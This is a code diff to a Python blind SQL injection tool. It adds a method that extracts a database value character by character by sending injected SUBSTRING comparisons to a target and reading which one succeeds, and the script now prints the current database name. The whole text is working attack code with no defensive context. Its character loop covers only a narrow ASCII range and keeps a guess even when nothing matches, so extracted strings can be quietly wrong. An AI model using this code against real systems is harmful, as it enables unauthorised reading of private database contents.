@@ -3,6 +3,7 @@
 import requests
 from urllib.parse import quote_plus
 from time import time
+from itertools import chain
 
 
 class Blind():
@@ -42,8 +43,27 @@ class Blind():
 
 		return i
 
+	def get_string(self, item, length=None):
+		if not length:
+			length = self.get_length(item)
+
+		condition = "SUBSTRING(" + item + ",{},1)='{}'"
+		string = ''
+
+		for i in range(1, length + 1):
+			r = False
+			for j in range(92, 123):
+				payload = self.make_payload(condition.format(i, chr(j)))
+				r = self.send(payload)
+				if r:
+					break
+
+			string += chr(j)
+
+		return string
+
 
 if __name__ == '__main__':
 	b = Blind()
 
-	print(b.get_length('DATABASE()'))
+	print(b.get_string('DATABASE()'))
